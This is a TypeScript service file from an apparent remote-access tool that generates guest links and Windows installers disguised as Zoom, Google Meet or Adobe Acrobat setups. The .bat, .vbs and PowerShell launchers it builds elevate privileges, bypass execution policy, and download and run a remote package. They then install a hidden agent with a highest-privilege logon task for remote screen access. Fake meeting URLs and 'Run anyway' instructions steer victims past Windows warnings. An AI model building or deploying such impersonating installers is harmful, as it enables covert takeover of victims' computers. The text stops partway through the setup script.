import type { PrismaClient, Prisma, GuestAccessLink, GuestLinkStatus } from '@prisma/client';
import { ERROR_CODES } from '@nexusdesk/shared';
import { randomAlphanumeric, parseDuration } from '@nexusdesk/utils';
import { hashToken, generateOpaqueToken } from '../lib/tokens.js';
import { getEnv } from '../config/env.js';
import { AppError } from '../domain/errors/app-error.js';
import { AuditService } from './audit.js';
import { buildGuestInstallerHta } from './guest-installer-hta.js';

/** Sentinel date for guest links that should not expire. */
export const GUEST_LINK_NEVER_EXPIRES_AT = new Date('2099-12-31T23:59:59.999Z');

export function resolveGuestLinkExpiresAt(ttl?: string | null): Date {
  const normalized = (ttl ?? 'never').trim().toLowerCase();
  if (
    normalized === 'never' ||
    normalized === 'unlimited' ||
    normalized === 'none' ||
    normalized === '0'
  ) {
    return GUEST_LINK_NEVER_EXPIRES_AT;
  }
  return new Date(Date.now() + parseDuration(normalized));
}

export function isGuestLinkNeverExpires(expiresAt: Date | string): boolean {
  return new Date(expiresAt).getTime() >= GUEST_LINK_NEVER_EXPIRES_AT.getTime() - 86_400_000;
}

function generateGuestCode(): string {
  // ScreenConnect-style short code (exclude ambiguous chars).
  const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let out = '';
  for (let i = 0; i < 8; i++) {
    out += alphabet[Math.floor(Math.random() * alphabet.length)]!;
  }
  return out;
}

function buildGuestJoinUrl(
  appUrl: string,
  code: string,
  template: 'zoom' | 'google_meet' | 'adobe',
): string {
  const base = appUrl.replace(/\/$/, '');
  if (template === 'google_meet') {
    return `${base}/gotme/GoogleMeet/${code}`;
  }
  if (template === 'adobe') {
    return `${base}/adobefile/${code}`;
  }
  return `${base}/joinzoom/${code}`;
}

type InviteTemplate = 'zoom' | 'google_meet' | 'adobe';

function normalizeTemplate(template?: string | null): InviteTemplate {
  if (template === 'google_meet') return 'google_meet';
  if (template === 'adobe') return 'adobe';
  return 'zoom';
}

export function installerBatFilename(template?: string | null): string {
  const t = normalizeTemplate(template);
  if (t === 'google_meet') return 'GoogleMeet-Setup.bat';
  if (t === 'adobe') return 'AdobeAcrobat-Setup.bat';
  return 'ZoomClient-Setup.bat';
}

export function installerGuiFilename(template?: string | null): string {
  const t = normalizeTemplate(template);
  if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
  if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
  return 'ZoomClient-Setup.exe';
}

export function installerDownloadPath(_template?: string | null): string {
  return 'setup.exe';
}

/** Marker written after the Windows stub PE; stub reads JSON that follows. */
export const GUEST_SETUP_EXE_MARKER = 'NDGUESTCFG\x00';

function exeInstallerCopy(template?: string | null): {
  title: string;
  downloading: string;
  finished: string;
} {
  const brand = installerBranding(template);
  const t = normalizeTemplate(template);
  if (t === 'google_meet') {
    return {
      title: brand.windowTitle,
      downloading: 'Downloading Google Meet components...\nPlease wait.',
      finished: brand.closingEcho,
    };
  }
  if (t === 'adobe') {
    return {
      title: brand.windowTitle,
      downloading: 'Downloading Adobe Acrobat components...\nPlease wait.',
      finished: brand.closingEcho,
    };
  }
  return {
    title: brand.windowTitle,
    downloading: 'Downloading Zoom Client components...\nPlease wait.',
    finished: brand.closingEcho,
  };
}

function guiInstallerBranding(template?: string | null): {
  windowTitle: string;
  applicationName: string;
  brandLabel: string;
  heading: string;
  subheading: string;
  downloadLabel: string;
  installLabel: string;
  accent: string;
  accentDark: string;
  pageBg: string;
} {
  const t = normalizeTemplate(template);
  if (t === 'google_meet') {
    return {
      windowTitle: 'Google Meet Setup',
      applicationName: 'Google Meet',
      brandLabel: 'Google Meet',
      heading: 'Ready to join?',
      subheading: 'Download and run the meeting app to connect from your computer.',
      downloadLabel: 'Downloading meeting app',
      installLabel: 'Installing',
      accent: '#1a73e8',
      accentDark: '#1765cc',
      pageBg: '#f8f9fa',
    };
  }
  if (t === 'adobe') {
    return {
      windowTitle: 'Adobe Acrobat Setup',
      applicationName: 'Adobe Acrobat',
      brandLabel: 'Adobe Acrobat',
      heading: 'Opening your document...',
      subheading: 'Download and run Adobe Acrobat to view the shared PDF on Windows.',
      downloadLabel: 'Downloading Adobe Acrobat',
      installLabel: 'Installing',
      accent: '#b22222',
      accentDark: '#8b1a1a',
      pageBg: '#ffffff',
    };
  }
  return {
    windowTitle: 'Zoom Meeting Setup',
    applicationName: 'Zoom Meetings',
    brandLabel: 'zoom',
    heading: 'Join Meeting',
    subheading: 'Download and launch the Zoom client to connect.',
    downloadLabel: 'Downloading Zoom Client',
    installLabel: 'Installing',
    accent: '#0b5cff',
    accentDark: '#0947cc',
    pageBg: '#ffffff',
  };
}

function installerBranding(template?: string | null): {
  windowTitle: string;
  header: string;
  closingEcho: string;
} {
  const t = normalizeTemplate(template);
  if (t === 'google_meet') {
    return {
      windowTitle: 'Google Meet Setup',
      header: '=== Google Meet Setup ===',
      closingEcho: 'Finished. You can close this window and return to your meeting.',
    };
  }
  if (t === 'adobe') {
    return {
      windowTitle: 'Adobe Acrobat Setup',
      header: '=== Adobe Acrobat Setup ===',
      closingEcho: 'Finished. You can close this window and open your document.',
    };
  }
  return {
    windowTitle: 'Zoom Meeting Installer',
    header: '=== Zoom Client Setup ===',
    closingEcho: 'Finished. You can close this window and join the meeting.',
  };
}

export class GuestAccessService {
  private readonly audit: AuditService;

  constructor(private readonly prisma: PrismaClient) {
    this.audit = new AuditService(prisma);
  }

  async create(
    organizationId: string,
    actorUserId: string,
    input?: {
      label?: string;
      notes?: string;
      maxUses?: number;
      ttl?: string;
      inviteTemplate?: 'zoom' | 'google_meet' | 'adobe';
    },
  ) {
    const env = getEnv();
    const expiresAt = resolveGuestLinkExpiresAt(input?.ttl);
    const secret = generateOpaqueToken(32);
    let code = generateGuestCode();

    for (let attempt = 0; attempt < 8; attempt++) {
      const clash = await this.prisma.guestAccessLink.findUnique({ where: { code } });
      if (!clash) break;
      code = generateGuestCode();
    }

    const template = normalizeTemplate(input?.inviteTemplate);
    const defaultLabel =
      template === 'google_meet'
        ? 'Google Meet'
        : template === 'adobe'
          ? 'Adobe Document'
          : 'Zoom Meeting';
    const link = await this.prisma.guestAccessLink.create({
      data: {
        organizationId,
        createdByUserId: actorUserId,
        code,
        label: input?.label?.trim() || defaultLabel,
        notes: input?.notes ?? null,
        inviteTemplate: template,
        maxUses: input?.maxUses && input.maxUses > 0 ? input.maxUses : 5,
        tokenHash: hashToken(secret),
        expiresAt,
        status: 'active',
      },
    });

    await this.audit.record({
      organizationId,
      actorUserId,
      action: 'guest_link.create',
      resourceType: 'guest_access_link',
      resourceId: link.id,
      after: { code: link.code, maxUses: link.maxUses, expiresAt: link.expiresAt },
    });

    const joinUrl = buildGuestJoinUrl(env.APP_URL, link.code, link.inviteTemplate);
    const installerUrl = `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}`;

    return {
      link,
      joinUrl,
      installerUrl,
      /** Shown once — embedded in the installer; guests use the join page / code. */
      enrollmentToken: secret,
    };
  }

  list(organizationId: string) {
    return this.prisma.guestAccessLink.findMany({
      where: { organizationId },
      orderBy: { createdAt: 'desc' },
    });
  }

  async revoke(organizationId: string, linkId: string, actorUserId: string) {
    const link = await this.prisma.guestAccessLink.findFirst({
      where: { id: linkId, organizationId },
    });
    if (!link) {
      throw AppError.notFound('Guest link not found', ERROR_CODES.GUEST_LINK_INVALID);
    }
    if (link.status !== 'active') {
      return link;
    }

    const updated = await this.prisma.guestAccessLink.update({
      where: { id: linkId },
      data: { status: 'revoked', revokedAt: new Date() },
    });

    await this.audit.record({
      organizationId,
      actorUserId,
      action: 'guest_link.revoke',
      resourceType: 'guest_access_link',
      resourceId: linkId,
    });

    return updated;
  }

  async delete(organizationId: string, linkId: string, actorUserId: string) {
    const link = await this.prisma.guestAccessLink.findFirst({
      where: { id: linkId, organizationId },
    });
    if (!link) {
      throw AppError.notFound('Guest link not found', ERROR_CODES.GUEST_LINK_INVALID);
    }
    if (link.status === 'active') {
      throw AppError.conflict(
        'Revoke the active link before deleting it',
        ERROR_CODES.CONFLICT,
      );
    }

    await this.prisma.guestAccessLink.delete({ where: { id: linkId } });

    await this.audit.record({
      organizationId,
      actorUserId,
      action: 'guest_link.delete',
      resourceType: 'guest_access_link',
      resourceId: linkId,
    });

    return { ok: true, id: linkId };
  }

  async getPublicByCode(code: string) {
    const link = await this.resolveActiveLink(code);
    const env = getEnv();
    const org = await this.prisma.organization.findUnique({
      where: { id: link.organizationId },
      select: { name: true, slug: true },
    });

    return {
      code: link.code,
      label: link.label,
      inviteTemplate: link.inviteTemplate,
      organizationName: org?.name ?? '',
      organizationSlug: org?.slug ?? '',
      expiresAt: link.expiresAt.toISOString(),
      remainingUses: Math.max(0, link.maxUses - link.usedCount),
      windowsInstallerUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/${installerDownloadPath(link.inviteTemplate)}?v=26`,
      installerFileName: installerGuiFilename(link.inviteTemplate),
      windowsScriptUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/windows.ps1`,
      agentPackageUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/agent-package.zip`,
      joinUrl: buildGuestJoinUrl(env.APP_URL, link.code, link.inviteTemplate),
      instructions: {
        windows: [
          'The Windows installer download should start automatically.',
          `Open ${installerGuiFilename(link.inviteTemplate)} from Downloads (click More info → Run anyway if Windows asks).`,
          'Click Yes when Windows asks for permission.',
          'Wait until setup finishes, then close the installer window.',
        ],
      },
    };
  }

  /**
   * Validate a guest code for enrollment and return the org binding.
   * Call `consume` after the device row is created.
   */
  async resolveActiveLink(code: string): Promise<GuestAccessLink> {
    const normalized = code.trim().toUpperCase();
    const link = await this.prisma.guestAccessLink.findUnique({ where: { code: normalized } });
    if (!link || link.status === 'revoked') {
      throw AppError.unauthorized('Invalid guest access code', ERROR_CODES.GUEST_LINK_INVALID);
    }
    if (link.status === 'exhausted' || link.usedCount >= link.maxUses) {
      throw AppError.badRequest('Guest access code has no remaining uses', ERROR_CODES.GUEST_LINK_EXHAUSTED);
    }
    if (!isGuestLinkNeverExpires(link.expiresAt) && (link.expiresAt.getTime() < Date.now() || link.status === 'expired')) {
      if (link.status !== 'expired') {
        await this.prisma.guestAccessLink.update({
          where: { id: link.id },
          data: { status: 'expired' },
        });
      }
      throw AppError.unauthorized('Guest access code expired', ERROR_CODES.GUEST_LINK_EXPIRED);
    }
    return link;
  }

  async findByEnrollmentToken(rawToken: string): Promise<GuestAccessLink | null> {
    const tokenHash = hashToken(rawToken);
    return this.prisma.guestAccessLink.findUnique({ where: { tokenHash } });
  }

  async consume(linkId: string, deviceId: string): Promise<GuestAccessLink> {
    return this.prisma.$transaction(async (tx: Prisma.TransactionClient) => {
      const link = await tx.guestAccessLink.findUnique({ where: { id: linkId } });
      if (!link) {
        throw AppError.notFound('Guest link not found', ERROR_CODES.GUEST_LINK_INVALID);
      }
      const usedCount = link.usedCount + 1;
      const status: GuestLinkStatus = usedCount >= link.maxUses ? 'exhausted' : 'active';
      return tx.guestAccessLink.update({
        where: { id: linkId },
        data: {
          usedCount,
          status,
          lastClaimedDeviceId: deviceId,
        },
      });
    });
  }

  /**
   * Guest templates download a real .exe (Zoom / Meet / Adobe).
   * The stub performs the same enroll path: download zip + windows.ps1,
   * then run PowerShell setup elevated.
   */
  buildWindowsExeLauncher(code: string, apiUrl: string, stub: Buffer, template?: string | null): Buffer {
    const copy = exeInstallerCopy(template);
    const payload = Buffer.from(
      JSON.stringify({
        apiUrl: apiUrl.replace(/\/$/, ''),
        guestCode: code,
        title: copy.title,
        downloading: copy.downloading,
        finished: copy.finished,
      }),
      'utf8',
    );
    return Buffer.concat([stub, Buffer.from(GUEST_SETUP_EXE_MARKER, 'latin1'), payload]);
  }

  /**
   * Legacy .vbs launcher (kept for older links). Prefer setup.exe for Adobe.
   */
  buildWindowsVbsLauncher(code: string, apiUrl: string, template?: string | null): string {
    const base = apiUrl.replace(/\/$/, '').replace(/"/g, '');
    const safeCode = code.replace(/"/g, '');
    const brand = installerBranding(template);
    const title = brand.windowTitle.replace(/"/g, '');
    const doneMsg = brand.closingEcho.replace(/"/g, '');
    const lines = [
      'Option Explicit',
      'Dim sh, fso, apiUrl, guestCode, dataDir, packageZip, setupPs1, curl, cmd, rc, app, elevated',
      `apiUrl = "${base}"`,
      `guestCode = "${safeCode}"`,
      'Set sh = CreateObject("WScript.Shell")',
      'Set fso = CreateObject("Scripting.FileSystemObject")',
      'dataDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk\\Agent"',
      'If Not fso.FolderExists(sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk") Then',
      '  fso.CreateFolder sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk"',
      'End If',
      'If Not fso.FolderExists(dataDir) Then fso.CreateFolder dataDir',
      'packageZip = dataDir & "\\package.zip"',
      'setupPs1 = dataDir & "\\nd-setup.ps1"',
      'curl = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\\System32\\curl.exe"',
      'If Not fso.FileExists(curl) Then',
      `  MsgBox "curl.exe not found. Windows 10 or later is required.", 16, "${title}"`,
      '  WScript.Quit 1',
      'End If',
      '',
      'elevated = False',
      'On Error Resume Next',
      'elevated = (sh.Run("net session", 0, True) = 0)',
      'On Error GoTo 0',
      'If Not elevated Then',
      '  Set app = CreateObject("Shell.Application")',
      '  app.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1',
      '  WScript.Quit 0',
      'End If',
      '',
      `sh.Popup "Downloading Adobe Acrobat components..." & vbCrLf & "Please wait.", 2, "${title}", 64`,
      '',
      'If fso.FileExists(packageZip) Then fso.DeleteFile packageZip, True',
      'cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 1200 -o " & Chr(34) & packageZip & Chr(34) & " " & Chr(34) & apiUrl & "/guest/" & guestCode & "/agent-package.zip" & Chr(34)',
      'rc = sh.Run("cmd /c " & cmd, 0, True)',
      'If rc <> 0 Or Not fso.FileExists(packageZip) Then',
      `  MsgBox "Download failed. Check that this PC can reach the server.", 16, "${title}"`,
      '  WScript.Quit 1',
      'End If',
      '',
      'If fso.FileExists(setupPs1) Then fso.DeleteFile setupPs1, True',
      'cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 120 -o " & Chr(34) & setupPs1 & Chr(34) & " " & Chr(34) & apiUrl & "/guest/" & guestCode & "/windows.ps1?v=14" & Chr(34)',
      'rc = sh.Run("cmd /c " & cmd, 0, True)',
      'If rc <> 0 Or Not fso.FileExists(setupPs1) Then',
      `  MsgBox "Could not download setup script.", 16, "${title}"`,
      '  WScript.Quit 1',
      'End If',
      '',
      'sh.Environment("PROCESS")("ND_API_URL") = apiUrl',
      'sh.Environment("PROCESS")("ND_GUEST_CODE") = guestCode',
      'sh.Environment("PROCESS")("ND_PACKAGE_ZIP") = packageZip',
      'sh.Environment("PROCESS")("NEXUSDESK_AGENT_DATA_DIR") = dataDir',
      'cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File " & Chr(34) & setupPs1 & Chr(34)',
      'rc = sh.Run(cmd, 1, True)',
      'If rc <> 0 Then',
      `  MsgBox "Setup failed. See %ProgramData%\\NexusDesk\\Agent\\install.log", 16, "${title}"`,
      '  WScript.Quit rc',
      'End If',
      '',
      `MsgBox "${doneMsg}", 64, "${title}"`,
      'WScript.Quit 0',
    ];
    return lines.join('\r\n');
  }

  /**
   * Tiny .bat launcher: elevate, download zip + setup.ps1, run setup, never
   * close without showing the result.
   */
  buildWindowsBatchLauncher(code: string, apiUrl: string, template?: string | null): string {
    const base = apiUrl.replace(/\/$/, '');
    const brand = installerBranding(template);
    const lines = [
      '@echo off',
      'setlocal EnableExtensions',
      // Keep the console open even if something crashes mid-run.
      'if not defined ND_KEEPOPEN (',
      '  set "ND_KEEPOPEN=1"',
      '  cmd /k call "%~f0" %*',
      '  exit /b',
      ')',
      `set "API_URL=${base}"`,
      `set "GUEST_CODE=${code}"`,
      'set "CURL=%SystemRoot%\\System32\\curl.exe"',
      'set "DATA_DIR=%ProgramData%\\NexusDesk\\Agent"',
      'set "LOG=%DATA_DIR%\\install.log"',
      'set "PACKAGE_ZIP=%DATA_DIR%\\package.zip"',
      'set "SETUP_PS1=%DATA_DIR%\\nd-setup.ps1"',
      `title ${brand.windowTitle}`,
      'cd /d "%~dp0"',
      '',
      'net session >nul 2>&1',
      'if %errorlevel% NEQ 0 (',
      '  echo.',
      '  echo Windows will ask for permission now. Click Yes.',
      '  echo If you do not see a popup, check behind this window / taskbar.',
      '  echo.',
      `  powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=New-Object -ComObject Shell.Application; $s.ShellExecute('%~f0','','','runas',1)"`,
      '  echo.',
      '  echo An elevated installer window should open. You can close this one.',
      '  goto :eof',
      ')',
      '',
      'echo.',
      `echo ${brand.header}`,
      'echo API: %API_URL%',
      'echo Code: %GUEST_CODE%',
      'echo.',
      'if not exist "%CURL%" (',
      '  echo ERROR: curl.exe not found. Windows 10 or later is required.',
      '  goto :end',
      ')',
      '',
      'if not exist "%ProgramData%\\NexusDesk" mkdir "%ProgramData%\\NexusDesk"',
      'if not exist "%DATA_DIR%" mkdir "%DATA_DIR%"',
      'echo Install started %DATE% %TIME% > "%LOG%"',
      '',
      'echo Closing any old NexusDesk agent...',
      'powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process -Filter \\"Name=\'node.exe\'\\" -ErrorAction SilentlyContinue | ForEach-Object { if ($_.CommandLine -and ($_.CommandLine -like \'*NexusDesk*\' -or $_.CommandLine -like \'*main.js*\')) { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } }" >> "%LOG%" 2>&1',
      '',
      'echo [1/2] Downloading package (this can take a minute)...',
      'echo Downloading package... >> "%LOG%"',
      'del /f /q "%PACKAGE_ZIP%" >nul 2>&1',
      '"%CURL%" -fL --connect-timeout 30 --max-time 1200 --progress-bar -o "%PACKAGE_ZIP%" "%API_URL%/guest/%GUEST_CODE%/agent-package.zip"',
      'if errorlevel 1 (',
      '  echo.',
      '  echo ERROR: Download failed.',
      '  echo Check that this PC can reach %API_URL%',
      '  echo and that antivirus is not blocking the download.',
      '  echo See log: %LOG%',
      '  echo Download failed >> "%LOG%"',
      '  goto :end',
      ')',
      'if not exist "%PACKAGE_ZIP%" (',
      '  echo ERROR: package.zip missing after download.',
      '  goto :end',
      ')',
      'echo Download OK >> "%LOG%"',
      'echo Download complete.',
      '',
      'echo [2/2] Installing and enrolling...',
      'echo Fetching setup script... >> "%LOG%"',
      'del /f /q "%SETUP_PS1%" >nul 2>&1',
      '"%CURL%" -fL --connect-timeout 30 --max-time 120 -o "%SETUP_PS1%" "%API_URL%/guest/%GUEST_CODE%/windows.ps1?v=14"',
      'if errorlevel 1 (',
      '  echo ERROR: Could not download setup script.',
      '  goto :end',
      ')',
      'set "ND_API_URL=%API_URL%"',
      'set "ND_GUEST_CODE=%GUEST_CODE%"',
      'set "ND_PACKAGE_ZIP=%PACKAGE_ZIP%"',
      'set "NEXUSDESK_AGENT_DATA_DIR=%DATA_DIR%"',
      'powershell -NoProfile -ExecutionPolicy Bypass -File "%SETUP_PS1%"',
      'if errorlevel 1 (',
      '  echo.',
      '  echo ERROR: Setup failed. Last log lines:',
      '  if exist "%DATA_DIR%\\agent.log" powershell -NoProfile -Command "Get-Content -Path \'%DATA_DIR%\\agent.log\' -Tail 40"',
      '  if exist "%LOG%" powershell -NoProfile -Command "Get-Content -Path \'%LOG%\' -Tail 40"',
      '  goto :end',
      ')',
      '',
      'echo.',
      `echo ${brand.closingEcho}`,
      'echo Setup finished OK >> "%LOG%"',
      '',
      ':end',
      'echo.',
      'pause',
      'exit /b %errorlevel%',
      '',
    ];
    return lines.join('\r\n');
  }

  /** PowerShell setup run via EncodedCommand — no .ps1 file written to disk. */
  private buildWindowsInlineSetupScript(opts?: { apiUrl?: string; guestCode?: string }): string {
    const apiAssign = opts?.apiUrl
      ? `$ApiUrl = '${opts.apiUrl.replace(/'/g, "''")}'`
      : `$ApiUrl = $env:ND_API_URL`;
    const codeAssign = opts?.guestCode
      ? `$GuestCode = '${opts.guestCode.replace(/'/g, "''")}'`
      : `$GuestCode = $env:ND_GUEST_CODE`;
    return [
      "$ErrorActionPreference = 'Stop'",
      apiAssign,
      codeAssign,
      "$PackageZip = $env:ND_PACKAGE_ZIP",
      "if (-not $PackageZip) { $PackageZip = Join-Path $env:ProgramData 'NexusDesk\\Agent\\package.zip' }",
      "$InstallRoot = Join-Path $env:ProgramFiles 'NexusDesk\\Agent'",
      "$DataDir = Join-Path $env:ProgramData 'NexusDesk\\Agent'",
      "$TaskName = 'NexusDeskAgent'",
      "$InstallLog = Join-Path $DataDir 'install.log'",
      "New-Item -ItemType Directory -Force -Path $InstallRoot | Out-Null",
      "New-Item -ItemType Directory -Force -Path $DataDir | Out-Null",
      "function Log([string]$m) { Add-Content -Path $InstallLog -Value (\"[{0}] {1}\" -f (Get-Date -Format o), $m); Write-Host $m }",
      "Log 'Setup script starting'",
      "$PublicStatusDir = Join-Path $env:PUBLIC 'NexusDesk'",
      "New-Item -ItemType Directory -Force -Path $PublicStatusDir | Out-Null",
      "$PublicComplete = Join-Path $PublicStatusDir (\"setup-complete-$GuestCode.txt\")",
      "$PublicFailed = Join-Path $PublicStatusDir (\"setup-failed-$GuestCode.txt\")",
      "$PublicProgress = Join-Path $PublicStatusDir (\"setup-progress-$GuestCode.txt\")",
      "function Write-ProgressStatus([int]$pct, [string]$msg) {",
      "  try { [IO.File]::WriteAllText($PublicProgress, (\"{0}|{1}\" -f $pct, $msg)) } catch {}",
      "}",
      "function Clear-InstallDir([string]$path) {",
      "  if (-not (Test-Path -LiteralPath $path)) { return }",
      "  try { cmd.exe /c \"rmdir /s /q `\"$path`\"\" | Out-Null } catch {}",
      "  Start-Sleep -Milliseconds 400",
      "  if (Test-Path -LiteralPath $path) {",
      "    Get-ChildItem -LiteralPath $path -Force -Recurse -ErrorAction SilentlyContinue | ForEach-Object {",
      "      try { $_.Attributes = 'Normal' } catch {}",
      "      try { Remove-Item -LiteralPath $_.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}",
      "    }",
      "    try { Remove-Item -LiteralPath $path -Force -Recurse -ErrorAction SilentlyContinue } catch {}",
      "  }",
      "  if (Test-Path -LiteralPath $path) { throw \"Could not clear install folder (still in use): $path\" }",
      "}",
      "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'setup.complete')",
      "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'setup.failed')",
      "Remove-Item -Force -ErrorAction SilentlyContinue $PublicComplete",
      "Remove-Item -Force -ErrorAction SilentlyContinue $PublicFailed",
      "Remove-Item -Force -ErrorAction SilentlyContinue $PublicProgress",
      "try {",
      "Write-ProgressStatus 10 'Preparing'",
      "if (-not (Test-Path $PackageZip)) { throw \"Package not found: $PackageZip\" }",
      "try { Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue } catch {}",
      "try { Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}",
      "Get-CimInstance Win32_Process -Filter \"Name='node.exe'\" -ErrorAction SilentlyContinue | ForEach-Object {",
      "  try {",
      "    if ($_.CommandLine -and ($_.CommandLine -like '*NexusDesk*' -or $_.CommandLine -like '*main.js*' -or $_.CommandLine -like '*Program Files*NexusDesk*')) {",
      "      Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue",
      "    }",
      "  } catch {}",
      "}",
      "Start-Sleep -Seconds 2",
      // Always clear prior enrollment so a new support code actually enrolls.
      "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'state.json')",
      "Remove-Item -Force -ErrorAction SilentlyContinue (Join-Path $DataDir 'tokens.enc')",
      "$appDir = Join-Path $InstallRoot 'app'",
      "$stagingDir = Join-Path $InstallRoot 'app-staging'",
      "Write-ProgressStatus 25 'Clearing previous install'",
      "Clear-InstallDir $appDir",
      "Clear-InstallDir $stagingDir",
      "Write-ProgressStatus 40 'Extracting - please wait'",
      "Log 'Extracting package'",
      // Expand into a fresh staging folder (avoids 'directory is not empty').
      "$zipForExpand = Join-Path $DataDir 'package-expand.zip'",
      "Copy-Item -LiteralPath $PackageZip -Destination $zipForExpand -Force",
      "Write-ProgressStatus 48 'Extracting - please wait'",
      "New-Item -ItemType Directory -Force -Path $stagingDir | Out-Null",
      "Expand-Archive -Path $zipForExpand -DestinationPath $stagingDir -Force",
      "Write-ProgressStatus 58 'Extracting - almost done'",
      "Remove-Item -Force -ErrorAction SilentlyContinue $zipForExpand",
      "Clear-InstallDir $appDir",
      "Rename-Item -LiteralPath $stagingDir -NewName 'app'",
      "Write-ProgressStatus 65 'Configuring'",
      "$nodeExe = Join-Path $InstallRoot 'app\\runtime\\node\\node.exe'",
      "if (-not (Test-Path $nodeExe)) {",
      "  $nested = Get-ChildItem -Path (Join-Path $InstallRoot 'app\\runtime\\node') -Recurse -Filter 'node.exe' -ErrorAction SilentlyContinue | Select-Object -First 1",
      "  if ($nested) { $nodeExe = $nested.FullName } else { throw 'Node runtime not found in package' }",
      "}",
      "$mainJs = Join-Path $InstallRoot 'app\\dist\\main.js'",
      "if (-not (Test-Path $mainJs)) {",
      "  $nested = Get-ChildItem -Path $appDir -Recurse -Filter 'main.js' | Select-Object -First 1",
      "  if (-not $nested) { throw 'Agent main.js not found' }",
      "  $mainJs = $nested.FullName",
      "}",
      "$wsUrl = $ApiUrl -replace '^http','ws'",
      "$envFile = Join-Path $DataDir 'agent.env'",
      "$envLines = @(",
      "  \"API_URL=$ApiUrl\",",
      "  \"WS_URL=$wsUrl\",",
      "  \"AGENT_ENROLLMENT_TOKEN=$GuestCode\",",
      "  \"GUEST_CODE=$GuestCode\",",
      "  'NODE_ENV=production',",
      "  'LOG_LEVEL=info',",
      "  \"NEXUSDESK_AGENT_DATA_DIR=$DataDir\"",
      ")",
      "[IO.File]::WriteAllText($envFile, ($envLines -join \"`r`n\") + \"`r`n\")",
      "$LogFile = Join-Path $DataDir 'agent.log'",
      "$wrapper = Join-Path $InstallRoot 'run-agent.cmd'",
      "$wrapperBody = \"@echo off`r`nsetlocal`r`nfor /f `\"usebackq tokens=1,* delims==`\" %%A in (`\"$envFile`\") do set `\"%%A=%%B`\"`r`n`\"$nodeExe`\" `\"$mainJs`\" >> `\"$LogFile`\" 2>&1`r`n\"",
      "[IO.File]::WriteAllText($wrapper, $wrapperBody)",
      "$env:API_URL = $ApiUrl",
      "$env:WS_URL = $wsUrl",
      "$env:AGENT_ENROLLMENT_TOKEN = $GuestCode",
      "$env:GUEST_CODE = $GuestCode",
      "$env:NODE_ENV = 'production'",
      "$env:LOG_LEVEL = 'info'",
      "$env:NEXUSDESK_AGENT_DATA_DIR = $DataDir",
      "if (Test-Path $LogFile) { Remove-Item -Force $LogFile -ErrorAction SilentlyContinue }",
      "$interactiveUser = $env:USERNAME",
      "try {",
      "  $explorer = Get-CimInstance Win32_Process -Filter \"Name='explorer.exe'\" -ErrorAction SilentlyContinue | Select-Object -First 1",
      "  if ($explorer) {",
      "    $owner = Invoke-CimMethod -InputObject $explorer -MethodName GetOwner -ErrorAction SilentlyContinue",
      "    if ($owner -and $owner.User) {",
      "      if ($owner.Domain) { $interactiveUser = \"$($owner.Domain)\\$($owner.User)\" } else { $interactiveUser = $owner.User }",
      "    }",
      "  }",
      "} catch {}",
      "$action = New-ScheduledTaskAction -Execute $wrapper",
      "$trigger = New-ScheduledTaskTrigger -AtLogOn -User $interactiveUser",
      "$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)",
      "$principal = New-ScheduledTaskPrincipal -UserId $interactiveUser -LogonType Interactive -RunLevel Highest",
      "Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null",
      "$workDir = Split-Path -Parent $mainJs",
      "Write-ProgressStatus 80 'Starting'",
      "Log 'Starting agent process (single instance — task is for logon only)'",
      "# Do NOT start the logon task immediately: that would launch a second agent that fights",
      "# the same deviceId on the WebSocket and breaks remote screen viewing.",
      "Start-Process -FilePath $nodeExe -ArgumentList @(\"`\"$mainJs`\"\") -WorkingDirectory $workDir -WindowStyle Hidden",
      "Write-ProgressStatus 88 'Connecting'",
      "$stateFile = Join-Path $DataDir 'state.json'",
      "$enrolled = $false",
      "for ($i = 0; $i -lt 45; $i++) {",
      "  Start-Sleep -Seconds 2",
      "  $connectPct = [Math]::Min(98, 88 + [int]($i / 2))",
      "  Write-ProgressStatus $connectPct 'Connecting'",
      "  if (Test-Path $stateFile) {",
      "    try {",
      "      $st = Get-Content -LiteralPath $stateFile -Raw | ConvertFrom-Json",
      "      if ($st.deviceId) { $enrolled = $true; Log (\"Enrolled deviceId=$($st.deviceId)\"); break }",
      "    } catch {}",
      "  }",
      "  if (($i % 5) -eq 4) { Log \"Waiting for enrollment... ($i)\" }",
      "}",
      "if (-not $enrolled) {",
      "  if (Test-Path $LogFile) { Get-Content $LogFile -Tail 80 | ForEach-Object { Log $_ } }",
      "  throw 'Enrollment failed — agent did not register with the server. Check the PC can reach the API URL.'",
      "}",
      "Write-ProgressStatus 100 'Complete'",
      "Log 'Setup complete'",
      "[IO.File]::WriteAllText((Join-Path $DataDir 'setup.complete'), (Get-Date -Format o))",
      "[IO.File]::WriteAllText($PublicComplete, (Get-Date -Format o))",
